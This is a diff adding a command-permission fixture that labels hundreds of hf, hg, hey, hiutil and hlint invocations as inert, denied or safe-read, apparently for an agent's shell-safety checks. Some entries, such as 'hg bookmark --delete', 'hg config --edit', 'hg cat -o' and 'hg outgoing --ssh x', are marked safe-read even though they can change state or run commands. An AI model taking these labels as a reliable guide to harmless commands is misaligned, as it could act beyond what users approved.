+hey recordings --help x	inert
+hey recordings --json	inert
+hey recordings --starts-on x	inert
+hey recordings --token x	inert
+hey recordings -h	inert
+hey recordings cal-123 --starts-on 2026-01-01 --ends-on 2026-01-31	inert
+hey recordings x	inert
+hey reply	denied
+hey reply thread-id	denied
+hey reply x	denied
+hey skill	denied
+hey skill x	denied
+hey threads	denied
+hey threads --base-url x	inert
+hey threads --cookie x	inert
+hey threads --help	inert
+hey threads --help --base-url x	inert
+hey threads --help --json	inert
+hey threads --help x	inert
+hey threads --json	inert
+hey threads --token x	inert
+hey threads -h	inert
+hey threads thread-id-123	inert
+hey threads x	inert
+hey timetrack	denied
+hey timetrack current	inert
+hey timetrack current --base-url x	inert
+hey timetrack current --cookie x	inert
+hey timetrack current --help	inert
+hey timetrack current --help --base-url x	inert
+hey timetrack current --help --json	inert
+hey timetrack current --help x	inert
+hey timetrack current --json	inert
+hey timetrack current --token x	inert
+hey timetrack current -h	inert
+hey timetrack current x	inert
+hey timetrack list	inert
+hey timetrack list --base-url x	inert
+hey timetrack list --cookie x	inert
+hey timetrack list --help	inert
+hey timetrack list --help --base-url x	inert
+hey timetrack list --help --json	inert
+hey timetrack list --help x	inert
+hey timetrack list --json	inert
+hey timetrack list --token x	inert
+hey timetrack list -h	inert
+hey timetrack list x	inert
+hey timetrack start	denied
+hey timetrack start x	denied
+hey timetrack stop	denied
+hey timetrack stop x	denied
+hey timetrack x	denied
+hey todo	denied
+hey todo add	denied
+hey todo add 'pick up milk'	denied
+hey todo add x	denied
+hey todo complete	denied
+hey todo complete x	denied
+hey todo delete	denied
+hey todo delete x	denied
+hey todo list	inert
+hey todo list --base-url x	inert
+hey todo list --cookie x	inert
+hey todo list --help	inert
+hey todo list --help --base-url x	inert
+hey todo list --help --json	inert
+hey todo list --help x	inert
+hey todo list --json	inert
+hey todo list --token x	inert
+hey todo list -h	inert
+hey todo list x	inert
+hey todo uncomplete	denied
+hey todo uncomplete x	denied
+hey todo x	denied
+hey x	denied
+hf	denied
+hf --help	inert
+hf --help --version	denied
+hf --help x	denied
+hf --version	inert
+hf -V	denied
+hf -h	inert
+hf -v	inert
+hf auth	denied
+hf auth x	denied
+hf cache	denied
+hf cache ls	denied
+hf cache ls --help	denied
+hf cache ls --help -h	denied
+hf cache ls --help x	denied
+hf cache ls -h	denied
+hf cache ls x	denied
+hf cache verify	denied
+hf cache verify --help	denied
+hf cache verify --help -h	denied
+hf cache verify --help x	denied
+hf cache verify -h	denied
+hf cache verify x	denied
+hf cache x	denied
+hf collections	denied
+hf collections info	denied
+hf collections info --help	denied
+hf collections info --help -h	denied
+hf collections info --help x	denied
+hf collections info -h	denied
+hf collections info x	denied
+hf collections ls	denied
+hf collections ls --help	denied
+hf collections ls --help --limit x	denied
+hf collections ls --help -h	denied
+hf collections ls --help x	denied
+hf collections ls --limit x	denied
+hf collections ls --owner x	denied
+hf collections ls -h	denied
+hf collections ls x	denied
+hf collections x	denied
+hf datasets	denied
+hf datasets info	denied
+hf datasets info --help	denied
+hf datasets info --help -h	denied
+hf datasets info --help x	denied
+hf datasets info -h	denied
+hf datasets info x	denied
+hf datasets ls	denied
+hf datasets ls --author x	denied
+hf datasets ls --filter x	denied
+hf datasets ls --help	denied
+hf datasets ls --help --author x	denied
+hf datasets ls --help -h	denied
+hf datasets ls --help x	denied
+hf datasets ls --limit x	denied
+hf datasets ls --search x	denied
+hf datasets ls --sort x	denied
+hf datasets ls -h	denied
+hf datasets ls x	denied
+hf datasets parquet	denied
+hf datasets parquet --help	denied
+hf datasets parquet --help -h	denied
+hf datasets parquet --help x	denied
+hf datasets parquet -h	denied
+hf datasets parquet x	denied
+hf datasets x	denied
+hf delete-cache	denied
+hf delete-cache x	denied
+hf delete-repo	denied
+hf delete-repo x	denied
+hf discussions	denied
+hf discussions diff	denied
+hf discussions diff --help	denied
+hf discussions diff --help -h	denied
+hf discussions diff --help x	denied
+hf discussions diff -h	denied
+hf discussions diff x	denied
+hf discussions info	denied
+hf discussions info --help	denied
+hf discussions info --help -h	denied
+hf discussions info --help x	denied
+hf discussions info -h	denied
+hf discussions info x	denied
+hf discussions list	denied
+hf discussions list --help	denied
+hf discussions list --help -h	denied
+hf discussions list --help x	denied
+hf discussions list -h	denied
+hf discussions list x	denied
+hf discussions x	denied
+hf download	denied
+hf download x	denied
+hf env	inert
+hf env --help	inert
+hf env --help -h	inert
+hf env --help x	inert
+hf env -h	inert
+hf env x	inert
+hf help	inert
+hf help x	inert
+hf jobs	denied
+hf jobs logs	denied
+hf jobs logs --help	denied
+hf jobs logs --help --tail x	denied
+hf jobs logs --help -h	denied
+hf jobs logs --help x	denied
+hf jobs logs --tail x	denied
+hf jobs logs -h	denied
+hf jobs logs x	denied
+hf jobs ps	denied
+hf jobs ps --help	denied
+hf jobs ps --help -h	denied
+hf jobs ps --help x	denied
+hf jobs ps -h	denied
+hf jobs ps x	denied
+hf jobs x	denied
+hf lfs-enable-largefiles	denied
+hf lfs-enable-largefiles x	denied
+hf lfs-multipart-upload	denied
+hf lfs-multipart-upload x	denied
+hf login	denied
+hf login x	denied
+hf logout	denied
+hf logout x	denied
+hf models	denied
+hf models info	denied
+hf models info --help	denied
+hf models info --help -h	denied
+hf models info --help x	denied
+hf models info -h	denied
+hf models info x	denied
+hf models ls	denied
+hf models ls --author x	denied
+hf models ls --filter x	denied
+hf models ls --help	denied
+hf models ls --help --author x	denied
+hf models ls --help -h	denied
+hf models ls --help x	denied
+hf models ls --limit x	denied
+hf models ls --search x	denied
+hf models ls --sort x	denied
+hf models ls -h	denied
+hf models ls x	denied
+hf models x	denied
+hf repo	denied
+hf repo x	denied
+hf repo-files	denied
+hf repo-files x	denied
+hf scan-cache	safe-read
+hf scan-cache --dir x	safe-read
+hf scan-cache --help	safe-read
+hf scan-cache --help --dir x	safe-read
+hf scan-cache --help --verbose	safe-read
+hf scan-cache --help x	safe-read
+hf scan-cache --verbose	safe-read
+hf scan-cache -h	safe-read
+hf scan-cache -v	safe-read
+hf scan-cache x	safe-read
+hf spaces	denied
+hf spaces info	denied
+hf spaces info --help	denied
+hf spaces info --help -h	denied
+hf spaces info --help x	denied
+hf spaces info -h	denied
+hf spaces info x	denied
+hf spaces ls	denied
+hf spaces ls --author x	denied
+hf spaces ls --filter x	denied
+hf spaces ls --help	denied
+hf spaces ls --help --author x	denied
+hf spaces ls --help -h	denied
+hf spaces ls --help x	denied
+hf spaces ls --limit x	denied
+hf spaces ls --search x	denied
+hf spaces ls --sort x	denied
+hf spaces ls -h	denied
+hf spaces ls x	denied
+hf spaces x	denied
+hf system	denied
+hf system x	denied
+hf tag	denied
+hf tag x	denied
+hf upload	denied
+hf upload x	denied
+hf upload-large-folder	denied
+hf upload-large-folder x	denied
+hf user	denied
+hf user x	denied
+hf version	inert
+hf version --help	inert
+hf version --help -h	inert
+hf version --help x	inert
+hf version -h	inert
+hf version x	inert
+hf whoami	safe-read
+hf whoami --help	safe-read
+hf whoami --help --token x	safe-read
+hf whoami --help -h	safe-read
+hf whoami --help x	safe-read
+hf whoami --token x	safe-read
+hf whoami -h	safe-read
+hf whoami x	safe-read
+hf x	denied
+hg	denied
+hg --help	inert
+hg --help --output x	denied
+hg --help --version	denied
+hg --help x	denied
+hg --output x	denied
+hg --version	inert
+hg -h	inert
+hg -o x	denied
+hg -v	inert
+hg add	denied
+hg add x	denied
+hg addremove	denied
+hg addremove x	denied
+hg annotate	denied
+hg annotate --changeset	safe-read
+hg annotate --changeset --date	safe-read
+hg annotate --changeset --exclude x	safe-read
+hg annotate --changeset x	safe-read
+hg annotate --date	safe-read
+hg annotate --exclude x	safe-read
+hg annotate --file	safe-read
+hg annotate --follow	safe-read
+hg annotate --help	safe-read
+hg annotate --ignore-all-space	safe-read
+hg annotate --ignore-blank-lines	safe-read
+hg annotate --ignore-space-at-eol	safe-read
+hg annotate --ignore-space-change	safe-read
+hg annotate --include x	safe-read
+hg annotate --line-number	safe-read
+hg annotate --no-binary	safe-read
+hg annotate --no-follow	safe-read
+hg annotate --number	safe-read
+hg annotate --quiet	safe-read
+hg annotate --rev x	safe-read
+hg annotate --skip x	safe-read
+hg annotate --text	safe-read
+hg annotate --user	safe-read
+hg annotate --verbose	safe-read
+hg annotate -B	safe-read
+hg annotate -I x	safe-read
+hg annotate -X x	safe-read
+hg annotate -Z	safe-read
+hg annotate -a	safe-read
+hg annotate -b	safe-read
+hg annotate -c	safe-read
+hg annotate -d	safe-read
+hg annotate -f	safe-read
+hg annotate -h	safe-read
+hg annotate -l	safe-read
+hg annotate -n	safe-read
+hg annotate -q	safe-read
+hg annotate -r x	safe-read
+hg annotate -u	safe-read
+hg annotate -v	safe-read
+hg annotate -w	safe-read
+hg annotate foo.py	safe-read
+hg annotate x	safe-read
+hg blame	denied
+hg blame --changeset	safe-read
+hg blame --changeset --date	safe-read
+hg blame --changeset --exclude x	safe-read
+hg blame --changeset x	safe-read
+hg blame --date	safe-read
+hg blame --exclude x	safe-read
+hg blame --file	safe-read
+hg blame --follow	safe-read
+hg blame --help	safe-read
+hg blame --ignore-all-space	safe-read
+hg blame --ignore-blank-lines	safe-read
+hg blame --ignore-space-at-eol	safe-read
+hg blame --ignore-space-change	safe-read
+hg blame --include x	safe-read
+hg blame --line-number	safe-read
+hg blame --no-binary	safe-read
+hg blame --no-follow	safe-read
+hg blame --number	safe-read
+hg blame --quiet	safe-read
+hg blame --rev x	safe-read
+hg blame --skip x	safe-read
+hg blame --text	safe-read
+hg blame --user	safe-read
+hg blame --verbose	safe-read
+hg blame -B	safe-read
+hg blame -I x	safe-read
+hg blame -X x	safe-read
+hg blame -Z	safe-read
+hg blame -a	safe-read
+hg blame -b	safe-read
+hg blame -c	safe-read
+hg blame -d	safe-read
+hg blame -f	safe-read
+hg blame -h	safe-read
+hg blame -l	safe-read
+hg blame -n	safe-read
+hg blame -q	safe-read
+hg blame -r x	safe-read
+hg blame -u	safe-read
+hg blame -v	safe-read
+hg blame -w	safe-read
+hg blame foo.py	safe-read
+hg blame x	safe-read
+hg bm	safe-read
+hg bm --active	safe-read
+hg bm --active --all	safe-read
+hg bm --active --rev x	safe-read
+hg bm --active x	safe-read
+hg bm --all	safe-read
+hg bm --delete	safe-read
+hg bm --force	safe-read
+hg bm --help	safe-read
+hg bm --inactive	safe-read
+hg bm --rename	safe-read
+hg bm --rev x	safe-read
+hg bm -B	safe-read
+hg bm -d	safe-read
+hg bm -f	safe-read
+hg bm -h	safe-read
+hg bm -i	safe-read
+hg bm -l	safe-read
+hg bm -m	safe-read
+hg bm -r x	safe-read
+hg bm x	safe-read
+hg bookmark	safe-read
+hg bookmark --active	safe-read
+hg bookmark --active --all	safe-read
+hg bookmark --active --rev x	safe-read
+hg bookmark --active x	safe-read
+hg bookmark --all	safe-read
+hg bookmark --delete	safe-read
+hg bookmark --force	safe-read
+hg bookmark --help	safe-read
+hg bookmark --inactive	safe-read
+hg bookmark --rename	safe-read
+hg bookmark --rev x	safe-read
+hg bookmark -B	safe-read
+hg bookmark -d	safe-read
+hg bookmark -f	safe-read
+hg bookmark -h	safe-read
+hg bookmark -i	safe-read
+hg bookmark -l	safe-read
+hg bookmark -m	safe-read
+hg bookmark -r x	safe-read
+hg bookmark x	safe-read
+hg bookmarks	safe-read
+hg bookmarks --active	safe-read
+hg bookmarks --active --all	safe-read
+hg bookmarks --active --rev x	safe-read
+hg bookmarks --active x	safe-read
+hg bookmarks --all	safe-read
+hg bookmarks --delete	safe-read
+hg bookmarks --force	safe-read
+hg bookmarks --help	safe-read
+hg bookmarks --inactive	safe-read
+hg bookmarks --rename	safe-read
+hg bookmarks --rev x	safe-read
+hg bookmarks -B	safe-read
+hg bookmarks -d	safe-read
+hg bookmarks -f	safe-read
+hg bookmarks -h	safe-read
+hg bookmarks -i	safe-read
+hg bookmarks -l	safe-read
+hg bookmarks -m	safe-read
+hg bookmarks -r x	safe-read
+hg bookmarks x	safe-read
+hg branch	safe-read
+hg branch --clean	safe-read
+hg branch --clean --force	safe-read
+hg branch --clean x	safe-read
+hg branch --force	safe-read
+hg branch --help	safe-read
+hg branch -C	safe-read
+hg branch -f	safe-read
+hg branch -h	safe-read
+hg branch x	safe-read
+hg branches	safe-read
+hg branches --active	safe-read
+hg branches --active --closed	safe-read
+hg branches --active --rev x	safe-read
+hg branches --active x	safe-read
+hg branches --closed	safe-read
+hg branches --help	safe-read
+hg branches --rev x	safe-read
+hg branches --style x	safe-read
+hg branches --template x	safe-read
+hg branches -T x	safe-read
+hg branches -a	safe-read
+hg branches -c	safe-read
+hg branches -h	safe-read
+hg branches -r x	safe-read
+hg branches x	safe-read
+hg bundle	denied
+hg bundle x	denied
+hg cat	denied
+hg cat --decode	safe-read
+hg cat --decode --exclude x	safe-read
+hg cat --decode --help	safe-read
+hg cat --decode x	safe-read
+hg cat --exclude x	safe-read
+hg cat --help	safe-read
+hg cat --include x	safe-read
+hg cat --output x	safe-read
+hg cat --rev x	safe-read
+hg cat --template x	safe-read
+hg cat -I x	safe-read
+hg cat -T x	safe-read
+hg cat -X x	safe-read
+hg cat -h	safe-read
+hg cat -o ./extracted-%s foo.py	safe-read
+hg cat -o x	safe-read
+hg cat -r x	safe-read
+hg cat x	safe-read
+hg checkout	denied
+hg checkout x	denied
+hg ci	denied
+hg ci x	denied
+hg clone	denied
+hg clone x	denied
+hg co	denied
+hg co x	denied
+hg commit	denied
+hg commit x	denied
+hg config	safe-read
+hg config --debug	safe-read
+hg config --debug --edit	safe-read
+hg config --debug --source x	safe-read
+hg config --debug x	safe-read
+hg config --edit	safe-read
+hg config --global	safe-read
+hg config --help	safe-read
+hg config --local	safe-read
+hg config --non-shared	safe-read
+hg config --quiet	safe-read
+hg config --source x	safe-read
+hg config --template x	safe-read
+hg config --user	safe-read
+hg config -T x	safe-read
+hg config -e	safe-read
+hg config -h	safe-read
+hg config -q	safe-read
+hg config x	safe-read
+hg convert	denied
+hg convert x	denied
+hg copy	denied
+hg copy x	denied
+hg cp	denied
+hg cp x	denied
+hg diff	safe-read
+hg diff --change	safe-read
+hg diff --change --change x	safe-read
+hg diff --change --git	safe-read
+hg diff --change x	safe-read
+hg diff --exclude x	safe-read
+hg diff --git	safe-read
+hg diff --ignore-all-space	safe-read
+hg diff --ignore-blank-lines	safe-read
+hg diff --ignore-changes	safe-read
+hg diff --ignore-space-at-eol	safe-read
+hg diff --ignore-space-change	safe-read
+hg diff --include x	safe-read
+hg diff --mar	safe-read
+hg diff --no-binary	safe-read
+hg diff --no-dates	safe-read
+hg diff --nodates	safe-read
+hg diff --noprefix	safe-read
+hg diff --patch	safe-read
+hg diff --rev x	safe-read
+hg diff --reverse	safe-read
+hg diff --root x	safe-read
+hg diff --show-function	safe-read
+hg diff --stat	safe-read
+hg diff --text	safe-read
+hg diff --unified	safe-read
+hg diff --unified x	safe-read
+hg diff --word-diff	safe-read
+hg diff -B	safe-read
+hg diff -I x	safe-read
+hg diff -U x	safe-read
+hg diff -X x	safe-read
+hg diff -Z	safe-read
+hg diff -a	safe-read
+hg diff -b	safe-read
+hg diff -c	safe-read
+hg diff -c x	safe-read
+hg diff -g	safe-read
+hg diff -h	safe-read
+hg diff -p	safe-read
+hg diff -r	safe-read
+hg diff -r x	safe-read
+hg diff -w	safe-read
+hg diff x	safe-read
+hg export	denied
+hg export x	denied
+hg files	safe-read
+hg files --exclude x	safe-read
+hg files --help	safe-read
+hg files --help --exclude x	safe-read
+hg files --help --print0	safe-read
+hg files --help x	safe-read
+hg files --include x	safe-read
+hg files --print0	safe-read
+hg files --quiet	safe-read
+hg files --rev x	safe-read
+hg files --verbose	safe-read
+hg files -0	safe-read
+hg files -I x	safe-read
+hg files -T x	safe-read
+hg files -X x	safe-read
+hg files -h	safe-read
+hg files -q	safe-read
+hg files -r x	safe-read
+hg files -v	safe-read
+hg files x	safe-read
+hg fixup	denied
+hg fixup x	denied
+hg forget	denied
+hg forget x	denied
+hg graft	denied
+hg graft x	denied
+hg grep	denied
+hg grep --all	safe-read
+hg grep --all --all-files	safe-read
+hg grep --all --exclude x	safe-read
+hg grep --all x	safe-read
+hg grep --all-files	safe-read
+hg grep --diff	safe-read
+hg grep --exclude x	safe-read
+hg grep --files-with-matches	safe-read
+hg grep --help	safe-read
+hg grep --ignore-case	safe-read
+hg grep --include x	safe-read
+hg grep --line-number	safe-read
+hg grep --print0	safe-read
+hg grep --rev	safe-read
+hg grep --rev x	safe-read
+hg grep --user x	safe-read
+hg grep -0	safe-read
+hg grep -I x	safe-read
+hg grep -X x	safe-read
+hg grep -a	safe-read
+hg grep -d	safe-read
+hg grep -h	safe-read
+hg grep -i	safe-read
+hg grep -l	safe-read
+hg grep -n	safe-read
+hg grep -r	safe-read
+hg grep -r x	safe-read
+hg grep -u x	safe-read
+hg grep x	safe-read
+hg heads	safe-read
+hg heads --active	safe-read
+hg heads --active --closed	safe-read
+hg heads --active --rev x	safe-read
+hg heads --active x	safe-read
+hg heads --closed	safe-read
+hg heads --help	safe-read
+hg heads --rev x	safe-read
+hg heads --style x	safe-read
+hg heads --template x	safe-read
+hg heads -T x	safe-read
+hg heads -a	safe-read
+hg heads -c	safe-read
+hg heads -h	safe-read
+hg heads -r x	safe-read
+hg heads x	safe-read
+hg help	inert
+hg help x	inert
+hg histedit	denied
+hg histedit x	denied
+hg id	safe-read
+hg id --bookmarks	safe-read
+hg id --bookmarks --branch	safe-read
+hg id --bookmarks --rev x	safe-read
+hg id --bookmarks x	safe-read
+hg id --branch	safe-read
+hg id --debug	safe-read
+hg id --help	safe-read
+hg id --id	safe-read
+hg id --num	safe-read
+hg id --rev x	safe-read
+hg id --tags	safe-read
+hg id -B	safe-read
+hg id -b	safe-read
+hg id -h	safe-read
+hg id -i	safe-read
+hg id -n	safe-read
+hg id -r	safe-read
+hg id -r x	safe-read
+hg id -t	safe-read
+hg id x	safe-read
+hg identify	safe-read
+hg identify --bookmarks	safe-read
+hg identify --bookmarks --branch	safe-read
+hg identify --bookmarks --rev x	safe-read
+hg identify --bookmarks x	safe-read
+hg identify --branch	safe-read
+hg identify --debug	safe-read
+hg identify --help	safe-read
+hg identify --id	safe-read
+hg identify --num	safe-read
+hg identify --rev x	safe-read
+hg identify --tags	safe-read
+hg identify -B	safe-read
+hg identify -b	safe-read
+hg identify -h	safe-read
+hg identify -i	safe-read
+hg identify -n	safe-read
+hg identify -r	safe-read
+hg identify -r x	safe-read
+hg identify -t	safe-read
+hg identify x	safe-read
+hg import	denied
+hg import x	denied
+hg incoming	safe-read
+hg incoming --bookmarks	safe-read
+hg incoming --bookmarks --branch	safe-read
+hg incoming --bookmarks --branch x	safe-read
+hg incoming --bookmarks x	safe-read
+hg incoming --branch	safe-read
+hg incoming --branch x	safe-read
+hg incoming --bundle	safe-read
+hg incoming --bundle x	safe-read
+hg incoming --force	safe-read
+hg incoming --graph	safe-read
+hg incoming --help	safe-read
+hg incoming --insecure	safe-read
+hg incoming --newest-first	safe-read
+hg incoming --patch	safe-read
+hg incoming --remotecmd x	safe-read
+hg incoming --rev x	safe-read
+hg incoming --ssh x	safe-read
+hg incoming -B	safe-read
+hg incoming -G	safe-read
+hg incoming -S	safe-read
+hg incoming -b	safe-read
+hg incoming -f	safe-read
+hg incoming -h	safe-read
+hg incoming -l	safe-read
+hg incoming -n	safe-read
+hg incoming -p	safe-read
+hg incoming -r	safe-read
+hg incoming -r x	safe-read
+hg incoming x	safe-read
+hg init	denied
+hg init x	denied
+hg log	safe-read
+hg log --branch	safe-read
+hg log --branch --branch x	safe-read
+hg log --branch --copies	safe-read
+hg log --branch x	safe-read
+hg log --copies	safe-read
+hg log --date x	safe-read
+hg log --debug	safe-read
+hg log --exclude x	safe-read
+hg log --follow	safe-read
+hg log --follow-first	safe-read
+hg log --git	safe-read
+hg log --graph	safe-read
+hg log --help	safe-read
+hg log --hidden	safe-read
+hg log --include x	safe-read
+hg log --keyword x	safe-read
+hg log --limit x	safe-read
+hg log --no-merges	safe-read
+hg log --patch	safe-read
+hg log --prune x	safe-read
+hg log --quiet	safe-read
+hg log --removed	safe-read
+hg log --rev x	safe-read
+hg log --reverse	safe-read
+hg log --stat	safe-read
+hg log --style	safe-read
+hg log --style x	safe-read
+hg log --template	safe-read
+hg log --template x	safe-read
+hg log --user	safe-read
+hg log --user x	safe-read
+hg log --verbose	safe-read
+hg log -G	safe-read
+hg log -M	safe-read
+hg log -T	safe-read
+hg log -T x	safe-read
+hg log -X x	safe-read
+hg log -b	safe-read
+hg log -c	safe-read
+hg log -d	safe-read
+hg log -d x	safe-read
+hg log -f	safe-read
+hg log -f x	safe-read
+hg log -g	safe-read
+hg log -h	safe-read
+hg log -k	safe-read
+hg log -k x	safe-read
+hg log -l	safe-read
+hg log -l x	safe-read
+hg log -p	safe-read
+hg log -q	safe-read
+hg log -r	safe-read
+hg log -r x	safe-read
+hg log -u	safe-read
+hg log -u x	safe-read
+hg log -v	safe-read
+hg log -y	safe-read
+hg log x	safe-read
+hg manifest	safe-read
+hg manifest --all	safe-read
+hg manifest --all --debug	safe-read
+hg manifest --all --rev x	safe-read
+hg manifest --all x	safe-read
+hg manifest --debug	safe-read
+hg manifest --help	safe-read
+hg manifest --rev x	safe-read
+hg manifest -h	safe-read
+hg manifest -r x	safe-read
+hg manifest x	safe-read
+hg merge	denied
+hg merge x	denied
+hg mv	denied
+hg mv x	denied
+hg outgoing	safe-read
+hg outgoing --bookmarks	safe-read
+hg outgoing --bookmarks --branch	safe-read
+hg outgoing --bookmarks --branch x	safe-read
+hg outgoing --bookmarks x	safe-read
+hg outgoing --branch	safe-read
+hg outgoing --branch x	safe-read
+hg outgoing --force	safe-read
+hg outgoing --graph	safe-read
+hg outgoing --help	safe-read
+hg outgoing --insecure	safe-read
+hg outgoing --newest-first	safe-read
+hg outgoing --patch	safe-read
+hg outgoing --remotecmd	safe-read
+hg outgoing --remotecmd x	safe-read
+hg outgoing --rev x	safe-read
+hg outgoing --ssh	safe-read
+hg outgoing --ssh x	safe-read
+hg outgoing -B	safe-read
+hg outgoing -G	safe-read
+hg outgoing -S	safe-read
+hg outgoing -b	safe-read
+hg outgoing -f	safe-read
+hg outgoing -h	safe-read
+hg outgoing -l	safe-read
+hg outgoing -n	safe-read
+hg outgoing -p	safe-read
+hg outgoing -r	safe-read
+hg outgoing -r x	safe-read
+hg outgoing x	safe-read
+hg parents	safe-read
+hg parents --help	safe-read
+hg parents --help --rev x	safe-read
+hg parents --help -h	safe-read
+hg parents --help x	safe-read
+hg parents --rev x	safe-read
+hg parents --style x	safe-read
+hg parents --template x	safe-read
+hg parents -T x	safe-read
+hg parents -h	safe-read
+hg parents -r x	safe-read
+hg parents x	safe-read
+hg paths	safe-read
+hg paths --help	safe-read
+hg paths --help --quiet	safe-read
+hg paths --help x	safe-read
+hg paths --quiet	safe-read
+hg paths --verbose	safe-read
+hg paths -q	safe-read
+hg paths -v	safe-read
+hg paths x	safe-read
+hg phase	denied
+hg phase x	denied
+hg pull	denied
+hg pull x	denied
+hg purge	denied
+hg purge x	denied
+hg push	denied
+hg push x	denied
+hg rebase	denied
+hg rebase x	denied
+hg remove	denied
+hg remove x	denied
+hg rename	denied
+hg rename x	denied
+hg revert	denied
+hg revert x	denied
+hg rm	denied
+hg rm x	denied
+hg rollback	denied
+hg rollback x	denied
+hg serve	denied
+hg serve x	denied
+hg shelve	denied
+hg shelve x	denied
+hg showconfig	safe-read
+hg showconfig --debug	safe-read
+hg showconfig --debug --edit	safe-read
+hg showconfig --debug --source x	safe-read
+hg showconfig --debug x	safe-read
+hg showconfig --edit	safe-read
+hg showconfig --global	safe-read
+hg showconfig --help	safe-read
+hg showconfig --local	safe-read
+hg showconfig --non-shared	safe-read
+hg showconfig --quiet	safe-read
+hg showconfig --source x	safe-read
+hg showconfig --template x	safe-read
+hg showconfig --user	safe-read
+hg showconfig -T x	safe-read
+hg showconfig -e	safe-read
+hg showconfig -h	safe-read
+hg showconfig -q	safe-read
+hg showconfig x	safe-read
+hg st	safe-read
+hg st --added	safe-read
+hg st --added --all	safe-read
+hg st --added --change x	safe-read
+hg st --added x	safe-read
+hg st --all	safe-read
+hg st --change x	safe-read
+hg st --clean	safe-read
+hg st --copies	safe-read
+hg st --deleted	safe-read
+hg st --exclude x	safe-read
+hg st --ignored	safe-read
+hg st --include x	safe-read
+hg st --modified	safe-read
+hg st --no-status	safe-read
+hg st --print0	safe-read
+hg st --quiet	safe-read
+hg st --removed	safe-read
+hg st --rev	safe-read
+hg st --rev x	safe-read
+hg st --terse	safe-read
+hg st --terse x	safe-read
+hg st --unknown	safe-read
+hg st -0	safe-read
+hg st -A	safe-read
+hg st -C	safe-read
+hg st -I x	safe-read
+hg st -T	safe-read
+hg st -X x	safe-read
+hg st -a	safe-read
+hg st -c	safe-read
+hg st -d	safe-read
+hg st -h	safe-read
+hg st -i	safe-read
+hg st -m	safe-read
+hg st -n	safe-read
+hg st -q	safe-read
+hg st -r	safe-read
+hg st -r x	safe-read
+hg st -t x	safe-read
+hg st -u	safe-read
+hg st x	safe-read
+hg status	safe-read
+hg status --added	safe-read
+hg status --added --all	safe-read
+hg status --added --change x	safe-read
+hg status --added x	safe-read
+hg status --all	safe-read
+hg status --change x	safe-read
+hg status --clean	safe-read
+hg status --copies	safe-read
+hg status --deleted	safe-read
+hg status --exclude x	safe-read
+hg status --ignored	safe-read
+hg status --include x	safe-read
+hg status --modified	safe-read
+hg status --no-status	safe-read
+hg status --print0	safe-read
+hg status --quiet	safe-read
+hg status --removed	safe-read
+hg status --rev	safe-read
+hg status --rev x	safe-read
+hg status --terse	safe-read
+hg status --terse x	safe-read
+hg status --unknown	safe-read
+hg status -0	safe-read
+hg status -A	safe-read
+hg status -C	safe-read
+hg status -I x	safe-read
+hg status -T	safe-read
+hg status -X x	safe-read
+hg status -a	safe-read
+hg status -c	safe-read
+hg status -d	safe-read
+hg status -h	safe-read
+hg status -i	safe-read
+hg status -m	safe-read
+hg status -n	safe-read
+hg status -q	safe-read
+hg status -r	safe-read
+hg status -r x	safe-read
+hg status -t x	safe-read
+hg status -u	safe-read
+hg status x	safe-read
+hg strip	denied
+hg strip x	denied
+hg sum	safe-read
+hg sum --help	safe-read
+hg sum --help --remote	safe-read
+hg sum --help x	safe-read
+hg sum --remote	safe-read
+hg sum -h	safe-read
+hg sum x	safe-read
+hg summary	safe-read
+hg summary --help	safe-read
+hg summary --help --remote	safe-read
+hg summary --help x	safe-read
+hg summary --remote	safe-read
+hg summary -h	safe-read
+hg summary x	safe-read
+hg tag	denied
+hg tag x	denied
+hg tags	safe-read
+hg tags --debug	safe-read
+hg tags --debug --help	safe-read
+hg tags --debug x	safe-read
+hg tags --help	safe-read
+hg tags --quiet	safe-read
+hg tags --verbose	safe-read
+hg tags -h	safe-read
+hg tags -q	safe-read
+hg tags -v	safe-read
+hg tags x	safe-read
+hg tip	safe-read
+hg tip --help	safe-read
+hg tip --help --patch	safe-read
+hg tip --help x	safe-read
+hg tip --patch	safe-read
+hg tip --style	safe-read
+hg tip --template	safe-read
+hg tip -T	safe-read
+hg tip -h	safe-read
+hg tip -p	safe-read
+hg tip x	safe-read
+hg unbundle	denied
+hg unbundle x	denied
+hg unshelve	denied
+hg unshelve x	denied
+hg up	denied
+hg up x	denied
+hg update	denied
+hg update x	denied
+hg verify	safe-read
+hg verify --help	safe-read
+hg verify --help -h	safe-read
+hg verify --help x	safe-read
+hg verify -h	safe-read
+hg verify x	safe-read
+hg version	inert
+hg version --help	inert
+hg version --help --template x	inert
+hg version --help -h	inert
+hg version --help x	inert
+hg version --template x	inert
+hg version -T x	inert
+hg version -h	inert
+hg version x	inert
+hg x	denied
+hiutil	denied
+hiutil --anchors	denied
+hiutil --anchors --create	denied
+hiutil --anchors --file x	denied
+hiutil --anchors x	denied
+hiutil --create	denied
+hiutil --file x	denied
+hiutil --help	inert
+hiutil --index-format x	denied
+hiutil --list-anchor-dictionary	denied
+hiutil --list-anchors	denied
+hiutil --list-files	denied
+hiutil --list-index-versions	denied
+hiutil --list-min-term-length	denied
+hiutil --list-stopwords	denied
+hiutil --list-terms	denied
+hiutil --purge-caches	denied
+hiutil --verbose	denied
+hiutil --version	inert
+hiutil -1	denied
+hiutil -A	denied
+hiutil -C	denied
+hiutil -D	denied
+hiutil -E	denied
+hiutil -F	denied
+hiutil -I x	denied
+hiutil -M	denied
+hiutil -P	denied
+hiutil -S	denied
+hiutil -T	denied
+hiutil -V	inert
+hiutil -a	denied
+hiutil -f x	denied
+hiutil -g	denied
+hiutil -h	inert
+hiutil -m x	denied
+hiutil -r x	denied
+hiutil -s x	denied
+hiutil -t x	denied
+hiutil -v	denied
+hiutil x	denied
+hlint	safe-read
+hlint --cc	safe-read
+hlint --cc --check	safe-read
+hlint --cc --cpp-define x	safe-read
+hlint --cc x	safe-read
+hlint --check	safe-read
+hlint --cpp-define x	safe-read
+hlint --cpp-file x	safe-read
+hlint --cpp-include x	safe-read
+hlint --cpp-simple	safe-read
+hlint --cross	safe-read
+hlint --data-dir x	safe-read
+hlint --default	safe-read
+hlint --encoding x	safe-read
+hlint --extension x	safe-read
+hlint --git x	safe-read
+hlint --help	safe-read
+hlint --hint x	safe-read
+hlint --ignore x	safe-read
+hlint --language x	safe-read
+hlint --lints x	safe-read
+hlint --match x	safe-read
+hlint --no-exit-code	safe-read
+hlint --no-summary	safe-read
+hlint --no-utf8	safe-read
+hlint --only x	safe-read
+hlint --path x	safe-read
+hlint --print-test	safe-read
+hlint --quiet	safe-read
+hlint --report	safe-read
+hlint --serialise	safe-read
+hlint --show	safe-read
+hlint --test	safe-read
+hlint --threads x	safe-read
+hlint --utf8 x	safe-read
+hlint --verbose	safe-read
+hlint --version	safe-read
